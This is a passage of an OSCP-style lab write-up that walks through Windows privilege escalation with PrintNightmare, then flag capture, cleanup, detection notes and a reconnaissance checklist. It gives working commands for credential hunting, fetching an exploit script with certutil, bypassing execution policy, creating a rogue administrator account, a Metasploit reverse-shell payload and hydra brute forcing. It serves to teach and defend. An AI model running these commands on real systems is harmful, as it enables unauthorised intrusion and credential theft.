+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="plain">whoami /priv
+whoami /groups
+net localgroup administrators</span></pre></div>
+<p>Read three things:</p>
+<table>
+<thead>
+<tr>
+<th>Look for</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SeImpersonatePrivilege</code> present</td>
+<td>a potato (PrintSpoofer / GodPotato / JuicyPotatoNG) works — one step to SYSTEM</td>
+</tr>
+<tr>
+<td><code>BUILTIN\Administrators</code> in <code>whoami /groups</code></td>
+<td>you are an admin; the only obstacle is UAC (<code>Medium Mandatory Level</code>)</td>
+</tr>
+<tr>
+<td>Neither</td>
+<td>standard user: you need a <em>local privilege escalation</em>, not a token theft</td>
+</tr>
+</tbody>
+</table>
+<p>On this host it was the third case: <code>offsec</code> is a plain local user, no impersonate privilege, not a
+member of the local administrators group. That is also why <code>getsystem</code> printed 1346 rather than
+succeeding on the RPCSS variant.</p>
+<blockquote>
+<p>If you only remember one thing from this box: <strong>potatoes are not a privilege-escalation technique,
+they are a way to use a privilege you already have.</strong> Without <code>SeImpersonate*</code>, skip them entirely.</p>
+</blockquote>
+<hr />
+<h3>5.3 What was checked and came back empty</h3>
+<p>These are the standard first-pass checks on a Windows foothold. They are listed because "I looked" is
+not evidence — each one has a specific <em>reading</em> that closes it off.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="plain">whoami /priv
+wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """"
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s
+type "C:\Program Files\Cloudbase Solutions\Cloudbase-Init\log\cloudbase-init.log"</span></pre></div>
+<table>
+<thead>
+<tr>
+<th>Check</th>
+<th>What a hit looks like</th>
+<th>Why it did not help here</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Unquoted service paths</td>
+<td>a path with spaces, unquoted, in a directory <code>Users</code> can write</td>
+<td>no such service on this image</td>
+</tr>
+<tr>
+<td><code>AlwaysInstallElevated</code></td>
+<td><code>0x1</code> under <strong>both</strong> HKLM and HKCU</td>
+<td>not set</td>
+</tr>
+<tr>
+<td>PowerShell history</td>
+<td>typed credentials or admin commands</td>
+<td>nothing usable</td>
+</tr>
+<tr>
+<td>PuTTY sessions</td>
+<td>hostnames and usernames for lateral movement</td>
+<td>no saved sessions with credentials</td>
+</tr>
+<tr>
+<td>Cloudbase-Init log</td>
+<td>the image's injected admin password</td>
+<td>present on the box, but not the shortest path once PrintNightmare was confirmed</td>
+</tr>
+</tbody>
+</table>
+<p>Note what is <em>not</em> on that list and why:</p>
+<ul>
+<li><strong>Hijacking MouseServer's own DLLs</strong> (<code>lum_sdk32.dll</code> on the sibling image) is pointless. The
+  process runs in <code>offsec</code>'s session, so a hijacked DLL gives you <code>offsec</code> again.</li>
+<li><strong><code>w3wp.exe</code></strong> is interesting but needs the port, and the web app was never identified. A <code>tcpConnTable</code>
+  walk from SNMP (chapter 02) would have named it; that is the faster route than guessing.</li>
+</ul>
+<hr />
+<h3>5.4 Enumerate patches, not versions</h3>
+<p>Build 19041 tells you "Windows 10 2004". It does not tell you whether the June/July 2021 cumulative
+updates are installed, and that single fact decides whether PrintNightmare works.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="plain">systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix"
+wmic qfe list brief | findstr /i "5004945 5004954 5005565"</span></pre></div>
+<ul>
+<li><code>KB5005565</code> (September 2021) and later contain the Point-and-Print hardening that breaks the
+  standard exploit path.</li>
+<li><code>KB5004945</code> / <code>KB5004954</code> (July 2021) are the out-of-band PrintNightmare patches.</li>
+<li><strong>An empty <code>Hotfix</code> list on a build-19041 image</strong> is the answer you want: nothing was ever applied.</li>
+</ul>
+<p>Metasploit automates this triage:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">background
+use post/multi/recon/local_exploit_suggester
+set SESSION 14
+run</span></pre></div>
+<p>It returns named modules — <code>exploit/windows/local/cve_2021_1675_printnightmare</code>, various
+<code>bypassuac_*</code>, and so on — with a confidence marker per module. Use it to <em>confirm</em> the theory you
+already formed, not instead of forming one.</p>
+<hr />
+<h3>5.5 The decision</h3>
+<table>
+<thead>
+<tr>
+<th>Route</th>
+<th>Requirement</th>
+<th>Status on this box</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Potato (<code>SeImpersonate</code>)</td>
+<td>the privilege</td>
+<td><strong>not held</strong> — 1346 proves it</td>
+</tr>
+<tr>
+<td>UAC bypass</td>
+<td>membership in Administrators</td>
+<td>not a member</td>
+</tr>
+<tr>
+<td>Unquoted path / writable service</td>
+<td>a misconfigured service</td>
+<td>none found</td>
+</tr>
+<tr>
+<td><code>AlwaysInstallElevated</code></td>
+<td>both registry keys</td>
+<td>not set</td>
+</tr>
+<tr>
+<td><strong>PrintNightmare</strong></td>
+<td>Spooler running + unpatched</td>
+<td><strong><code>spoolsv.exe</code> confirmed via SNMP, 19041 unpatched</strong></td>
+</tr>
+</tbody>
+</table>
+<p>One column is green, and it was green before the shell ever landed: SNMP had already told us
+<code>spoolsv.exe</code> was running. That is the payoff of enumerating processes properly in chapter 02.</p></div></section>
+<section class="chapter" id="ch-06" data-title="Privilege escalation"><div class="ch-head"><span class="ch-num">06</span><div class="ch-title"><h2>Privilege escalation</h2><p class="ch-sub">PrintNightmare from a standard user</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Goal: go from a standard user to a local administrator on a build-19041 host with the Spooler running
+and no <code>SeImpersonatePrivilege</code> to abuse.</p>
+<hr />
+<h3>6.1 Why this vulnerability fits this token</h3>
+<p>PrintNightmare abuses the Print Spooler's <code>RpcAddPrinterDriverEx</code> interface. The Spooler runs as
+<strong>SYSTEM</strong>, and it will load a print driver DLL from a path the caller supplies. Historically it did
+not require the caller to be an administrator for every code path, and it never validated that the
+DLL came from a trusted location. The result:</p>
+<blockquote>
+<p>any authenticated local user can make a SYSTEM service load their DLL.</p>
+</blockquote>
+<p>Two CVE identifiers matter, and it is worth knowing which is which:</p>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>What it is</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>CVE-2021-1675</strong></td>
+<td>the original "Print Spooler RCE" — the <code>AddPrinterDriverEx</code> path traversal/loading flaw</td>
+</tr>
+<tr>
+<td><strong>CVE-2021-34527</strong></td>
+<td>the <em>bypass</em> of the July 2021 patch — the remote/<code>\\attacker\share</code> variant that made it famous</td>
+</tr>
+</tbody>
+</table>
+<p>The classic <code>Invoke-Nightmare</code> script targets the 1675 interface locally and needs only a normal user
+session. That is exactly the situation after chapter 05: no impersonate privilege, no admin group
+membership, but a live Spooler.</p>
+<p>Precondition, restated: <strong><code>spoolsv.exe</code> must be running.</strong> SNMP confirmed it in chapter 02, before we
+ever had a shell.</p>
+<hr />
+<h3>6.2 Get the script onto the box</h3>
+<p>From a Meterpreter session:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">cd C:\Users\offsec\AppData\Local\Temp
+upload /opt/tools/cve-2021-1675.ps1
+load powershell
+powershell_shell</span></pre></div>
+<p>Without Meterpreter, <code>certutil</code> works on this image family where other transfers do not:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="plain">cd C:\Users\offsec\AppData\Local\Temp
+certutil -urlcache -split -f http://192.168.45.158/cve-2021-1675.ps1 cve-2021-1675.ps1
+powershell -ep bypass</span></pre></div>
+<p><code>-ep bypass</code> matters: the default execution policy would refuse the unsigned script.</p>
+<hr />
+<h3>6.3 Run it</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">cve</span><span class="p">-</span><span class="n">2021</span><span class="p">-</span><span class="n">1675</span><span class="p">.</span><span class="n">ps1</span>
+<span class="nb">Invoke-Nightmare</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">PS C:\Users\offsec\AppData\Local\Temp&gt; Import-Module .\cve-2021-1675.ps1
+PS C:\Users\offsec\AppData\Local\Temp&gt; Invoke-Nightmare
+[+] using default new user: adm1n
+[+] using default new password: P@ssw0rd
+[+] created payload at C:\Users\offsec\AppData\Local\Temp\nightmare.dll
+[+] using pDriverPath = "C:\WINDOWS\System32\DriverStore\FileRepository\ntprin
+[+] added user  as local administrator
+[+] deleting payload from C:\Users\offsec\AppData\Local\Temp\nightmare.dll</span></pre></div>
+<p>Read the output line by line:</p>
+<table>
+<thead>
+<tr>
+<th>Line</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>using default new user: adm1n</code></td>
+<td>the script defaults to creating <code>adm1n</code> / <code>P@ssw0rd</code>; pass <code>-NewUser</code>/<code>-NewPassword</code> to change</td>
+</tr>
+<tr>
+<td><code>created payload at …\nightmare.dll</code></td>
+<td>a DLL that calls <code>NetLocalGroupAddMembers</code> when the Spooler loads it</td>
+</tr>
+<tr>
+<td><code>using pDriverPath … ntprint.inf_amd64_…</code></td>
+<td>an existing, signed printer driver INF used as the vehicle</td>
+</tr>
+<tr>
+<td><code>added user  as local administrator</code></td>
+<td><strong>the blank name is a bug in the script's string formatting, not a failure.</strong> The account created is <code>adm1n</code></td>
+</tr>
+<tr>
+<td><code>deleting payload …</code></td>
+<td>it cleans the DLL up itself; no artifact left in TEMP</td>
+</tr>
+</tbody>
+</table>
+<p>That blank field is worth flagging explicitly, because the obvious reading — "it added <em>nothing</em>" —
+is wrong, and people re-run the exploit chasing a failure that did not happen. The proof is the next
+command, not the message.</p>
+<hr />
+<h3>6.4 Verify before you use it</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="n">net</span> <span class="n">user</span> <span class="n">adm1n</span>
+<span class="n">net</span> <span class="n">localgroup</span> <span class="n">administrators</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">User name                    adm1n
+Local Group Memberships      *Administrators</span></pre></div>
+<p>If <code>adm1n</code> is absent, the Spooler rejected the driver load — check <code>Get-Service Spooler</code>, and look at
+<code>C:\Windows\System32\spool\drivers\x64\3\</code> for leftovers. If the account exists but is not in
+<code>Administrators</code>, the DLL ran but the group call failed; create the membership manually from the
+SYSTEM context it gave you.</p>
+<hr />
+<h3>6.5 Use the account</h3>
+<p>An administrator session is what you need for the flag; a <em>network</em> logon is not the same as an
+interactive one, so RDP is the cleanest route:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>xfreerdp<span class="w"> </span>/u:adm1n<span class="w"> </span>/v:192.168.103.145<span class="w"> </span>/p:<span class="s1">&#39;P@ssw0rd&#39;</span><span class="w"> </span>/cert:ignore<span class="w"> </span>+clipboard
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">xfreerdp /u:adm1n /v:192.168.103.145 /p:'P@ssw0rd'</span></pre></div>
+<p>Notes that save time:</p>
+<ul>
+<li>The password contains characters the shell will happily eat — <strong>single-quote it</strong> in bash.</li>
+<li>RDP was <code>filtered</code> in the original scan. It answered once the lab was refreshed; re-scan before
+  concluding it is closed.</li>
+<li>If RDP is genuinely unavailable, an admin context is also reachable with
+  <code>runas /user:adm1n cmd</code> from any shell, or <code>psexec.py</code>/<code>wmiexec.py</code> with those credentials — but
+  those give you a network logon and a non-interactive desktop, which matters if the flag is on a
+  user's desktop.</li>
+</ul>
+<h4>Why an admin and not SYSTEM</h4>
+<p><code>adm1n</code> is a <strong>local administrator</strong>, which is enough to read <code>proof.txt</code> and to take ownership of
+any profile's files. It is <em>not</em> SYSTEM. If a box required SYSTEM specifically, the next step from
+here is one command — make the account's payload a service:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="plain">sc create pwn binPath= "cmd /c C:\Users\offsec\AppData\Local\Temp\s.bat" start= auto
+sc start pwn</span></pre></div>
+<p>or simply re-use the admin token with <code>getsystem</code> from a Meterpreter session running as <code>adm1n</code>
+(that token <em>does</em> carry <code>SeImpersonatePrivilege</code>, so the potato path opens up).</p>
+<hr />
+<h3>6.6 Alternatives if the script is blocked</h3>
+<table>
+<thead>
+<tr>
+<th>Route</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Metasploit module</td>
+<td><code>use exploit/windows/local/cve_2021_1675_printnightmare</code>, <code>set SESSION</code>, <code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code>, <code>run</code></td>
+</tr>
+<tr>
+<td>SharpPrintNightmare</td>
+<td><code>SharpPrintNightmare.exe C:\Windows\System32\spool\drivers\x64\3\evil.dll</code> (remote variant takes a UNC path)</td>
+</tr>
+<tr>
+<td>Manual</td>
+<td><code>RpcAddPrinterDriverEx</code> via <code>Invoke-PrintNightmare</code>/<code>PrintNightmare.py</code> from cube0x0</td>
+</tr>
+</tbody>
+</table>
+<p>All of them need the same two things: an authenticated local session and a running Spooler.</p>
+<hr />
+<h3>6.7 Does this box even need SYSTEM?</h3>
+<p>Worth saying out loud, because it changes how much work you do: on this host the flag was readable
+from the <strong>administrator's</strong> context, and PrintNightmare delivered exactly that. Escalating further to
+SYSTEM would have been ceremony, not progress.</p>
+<p>Judge the requirement from what you actually need to read, not from a habit of "always get SYSTEM".</p></div></section>
+<section class="chapter" id="ch-07" data-title="Flags and cleanup"><div class="ch-head"><span class="ch-num">07</span><div class="ch-title"><h2>Flags &amp; cleanup</h2><p class="ch-sub">Proof, removing adm1n, lessons</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Goal: capture the proof, then remove every artefact this box was made to leave behind.</p>
+<hr />
+<h3>7.1 Where the flags live on an OSCP-style Windows box</h3>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Owner</th>
+<th>Needs</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>local.txt</code></td>
+<td>the foothold user</td>
+<td>your shell as <code>offsec</code></td>
+</tr>
+<tr>
+<td><code>proof.txt</code></td>
+<td><code>Administrator</code></td>
+<td>local admin / SYSTEM</td>
+</tr>
+</tbody>
+</table>
+<p>Standard locations:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="plain">type C:\Users\offsec\Desktop\local.txt
+type C:\Users\Administrator\Desktop\proof.txt</span></pre></div>
+<p>The usual alternates, in the order worth trying:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="plain">dir C:\proof.txt C:\Users\Public\Desktop\proof.txt C:\Users\Administrator\Desktop\proof.txt 2&gt;nul</span></pre></div>
+<p>From Meterpreter (recursive search — slow on a full volume, but thorough):</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">search -f proof.txt -d C:\
+search -f local.txt -d C:\</span></pre></div>
+<h3>7.2 Reading proof.txt</h3>
+<p>Over RDP as <code>adm1n</code>, open <code>C:\Users\Administrator\Desktop\proof.txt</code>. Because <code>adm1n</code> is a local
+administrator, the profile's ACLs do not stop you; if a file is stubborn, Explorer → Properties →
+Security → take ownership, or from an admin <code>cmd</code>:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="plain">icacls C:\Users\Administrator\Desktop\proof.txt /grant adm1n:F
+type C:\Users\Administrator\Desktop\proof.txt</span></pre></div>
+<blockquote>
+<p><strong>Flag values are deliberately not reproduced in this writeup.</strong> Copy the hash into your own notes
+and the score sheet — publishing a live exam flag is both useless to a reader and a rules problem
+on the platform it came from.</p>
+</blockquote>
+<hr />
+<h3>7.3 Cleanup — the part people skip</h3>
+<p>You created an account, dropped a DLL, and opened a console window on somebody's desktop. Undo it.</p>
+<p><strong>1. Remove the account you created</strong> (as an administrator):</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="plain">net user adm1n /delete
+net localgroup administrators</span></pre></div>
+<p><strong>2. Remove the scripts and stages:</strong></p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="plain">del C:\Users\offsec\AppData\Local\Temp\cve-2021-1675.ps1
+del C:\Users\offsec\AppData\Local\Temp\s.exe
+del C:\Users\offsec\AppData\Local\Temp\nightmare.dll</span></pre></div>
+<p><code>Invoke-Nightmare</code> deletes its own DLL, but only on the success path — check anyway.</p>
+<p><strong>3. Check for leftover print drivers.</strong> PrintNightmare loads a driver into the Spooler; a failed run
+can leave a package behind:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="plain">dir C:\Windows\System32\spool\drivers\x64\3\
+rundll32 printui.dll,PrintUIEntry /s /t2</span></pre></div>
+<p>Remove anything you did not find before you started.</p>
+<p><strong>4. Close the sessions</strong> — <code>sessions -K</code> on the MSF side — and revert the snapshot if the lab is
+snapshot-based. On this box uptime was 48 minutes at first contact, so the image was freshly booted;
+a revert is a legitimate and complete cleanup.</p>
+<p><strong>5. Report the side effect you cannot undo:</strong> the console window on the desktop. It is the visible
+artefact of a keystroke-injection exploit and should be in the report's "detection opportunities"
+section.</p>
+<hr />
+<h3>7.4 What this box teaches</h3>
+<p><strong>1. <code>filtered</code> is not <code>closed</code>, and TCP is not everything.</strong>
+Ten ports came back <code>filtered</code> and the box looked dead. It was alive on UDP/161 the whole time. A
+port scan describes a firewall's opinion, not a host's services — and <code>1978/tcp</code> flipped from
+<code>filtered</code> to <code>open</code> after a snapshot refresh, so ports must be re-verified, not remembered.</p>
+<p><strong>2. SNMP answers "what is installed" and "who is logged in".</strong>
+<code>hrSWInstalledName</code> named the vulnerable package; <code>hrSWRunName</code> proved an interactive desktop existed.
+The second fact is invisible to any port scan and is the <em>precondition</em> for a keystroke exploit. That
+is why <code>snmpwalk</code> on <code>1.3.6.1.2.1.25.4.2.1.2</code> is worth more than the ports it costs.</p>
+<p><strong>3. A filtered port is not a reason to abandon the CVE.</strong>
+<code>1978</code> was filtered on first contact. The right response is to re-scan, then to look for a way to
+reach it (IIS, pivot, loopback) — not to pick a different exploit.</p>
+<p><strong>4. Read the escalation error, do not retry the tool.</strong>
+<code>1346 ERROR_BAD_IMPERSONATION_LEVEL</code> means "no <code>SeImpersonatePrivilege</code>". Running <code>getsystem</code> five
+more times, or swapping PrintSpoofer for GodPotato, changes nothing: potatoes <em>consume</em> a privilege,
+they do not create one. Change class of attack instead.</p>
+<p><strong>5. Patch level is not version.</strong>
+Build 19041 is a release, not a hotfix level. <code>systeminfo</code>/<code>wmic qfe</code> decides whether
+PrintNightmare is available, and SNMP can never tell you.</p>
+<p><strong>6. Escalate to the level the objective needs.</strong>
+A local admin read the flag. SYSTEM would have been more work for no additional proof.</p>
+<hr />
+<h3>7.5 Detection notes (for the report)</h3>
+<table>
+<thead>
+<tr>
+<th>Action</th>
+<th>Where it shows up</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SNMP walk</td>
+<td><code>snmp.exe</code> request counters; UDP/161 from an unexpected host</td>
+</tr>
+<tr>
+<td>CVE-2022-3218</td>
+<td>a console window on the desktop; the MouseServer process spawning <code>cmd.exe</code></td>
+</tr>
+<tr>
+<td><code>certutil -urlcache</code></td>
+<td><code>Microsoft-Windows-CertUtil</code>/PowerShell script-block logs; the URL in proxy logs</td>
+</tr>
+<tr>
+<td>PrintNightmare</td>
+<td>Spooler <code>AddPrinterDriverEx</code> events, a new local account, Security 4720/4732</td>
+</tr>
+<tr>
+<td><code>adm1n</code> creation</td>
+<td>Security event <strong>4720</strong> (user created) + <strong>4732</strong> (added to Administrators)</td>
+</tr>
+<tr>
+<td>RDP logon</td>
+<td>Security <strong>4624</strong> type 10 from an unusual source</td>
+</tr>
+</tbody>
+</table>
+<p>The last two are the loudest things on this box. A blue team that only alerts on those would still
+have caught the escalation — which is worth saying in the report, because it separates "exploitable"
+from "undetectable".</p></div></section>
+<section class="chapter" id="ch-08" data-title="Methodology"><div class="ch-head"><span class="ch-num">08</span><div class="ch-title"><h2>Methodology</h2><p class="ch-sub">The repeatable per-box loop</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The loop I run on every box, in order, with the rule that makes each step worth its time. This is
+deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only
+where evidence points.</p>
+<hr />
+<h3>Phase 0 — Setup</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>mkdir<span class="w"> </span>-p<span class="w"> </span>/tmp/&lt;box&gt;<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/tmp/&lt;box&gt;
+<span class="nb">export</span><span class="w"> </span><span class="nv">TARGET</span><span class="o">=</span>&lt;ip&gt;
+</pre></div>
+<p>Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the
+report afterwards trivial and stops me confusing two boxes' output.</p>
+<hr />
+<h3>Phase 1 — Reachability and TCP</h3>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Command</th>
+<th>Rule</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Ping</td>
+<td><code>ping -c 2 -W 2 $TARGET</code></td>
+<td>TTL tells you the OS before you scan (64 Linux, 128 Windows)</td>
+</tr>
+<tr>
+<td>Full TCP</td>
+<td><code>nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET</code></td>
+<td><strong>Always <code>-p-</code>.</strong> A top-1000 scan is a guess</td>
+</tr>
+<tr>
+<td>Versions</td>
+<td><code>nmap -sV -sC -p&lt;open&gt; -oN services.txt $TARGET</code></td>
+<td>Only the open ports; <code>-sC</code> is cheap and occasionally decisive</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Decision:</strong> for each open port, ask "what is the <em>configuration</em> weakness most likely to be, given
+this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.</p>
+<hr />
+<h3>Phase 2 — UDP (do not skip this)</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nmap<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">30</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>--host-timeout<span class="w"> </span>180s<span class="w"> </span><span class="nv">$TARGET</span>
+</pre></div>
+<p>If <code>161/udp</code> is open:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="k">done</span>
+</pre></div>
+<p>Then, on success, always:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2<span class="w">   </span><span class="c1"># nsExtendTable — the money tree</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.4.2.1.2<span class="w">   </span><span class="c1"># process names</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.6.3.1.2<span class="w">   </span><span class="c1"># installed packages</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.4.20.1.1<span class="w">     </span>#<span class="w"> </span>interface<span class="w"> </span>IPs
+</pre></div>
+<p><code>nsExtendTable</code> gives you the commands the agent runs plus the admin's own description of them.
+Descriptions are written for an internal audience and routinely name accounts and policies.</p>
+<hr />
+<h3>Phase 3 — Per-service enumeration</h3>
+<p>For each service, in the order that historically pays fastest.</p>
+<h4>HTTP/HTTPS</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20<span class="w">          </span><span class="c1"># stock page? framework? redirect?</span>
+<span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span>robots.txt<span class="w"> </span>sitemap.xml<span class="w"> </span>.git/<span class="w"> </span>.htaccess<span class="w"> </span>server-status<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code} %{size_download}  /</span><span class="nv">$p</span><span class="s2">\n&quot;</span><span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="nv">$p</span>
+<span class="k">done</span>
+feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$TARGET</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
+</pre></div>
+<ul>
+<li>Note the <strong>404 body size</strong> — it is your filter for everything after.</li>
+<li>Vhosts: <code>ffuf -u http://$TARGET/ -H "Host: FUZZ" -w &lt;subdomains&gt; -fr "&lt;default page text&gt;"</code>.</li>
+<li>Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.</li>
+</ul>
+<h4>FTP</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$&#39;user anonymous anon@test\nls\nbye&#39;</span><span class="w">   </span><span class="c1"># 530 on USER = anonymous_enable=NO</span>
+hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>ftp://<span class="nv">$TARGET</span>
+</pre></div>
+<p>Try the account name as the password. Check for key material, configs, and backups in the data
+directory — a shared <code>/srv/ftp</code> often leaks a <em>different</em> account's secrets.</p>
+<h4>SSH</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>-i<span class="w"> </span>key<span class="w"> </span>-o<span class="w"> </span><span class="nv">BatchMode</span><span class="o">=</span>yes<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span>id<span class="w">      </span><span class="c1"># never point a key at a host without -o BatchMode</span>
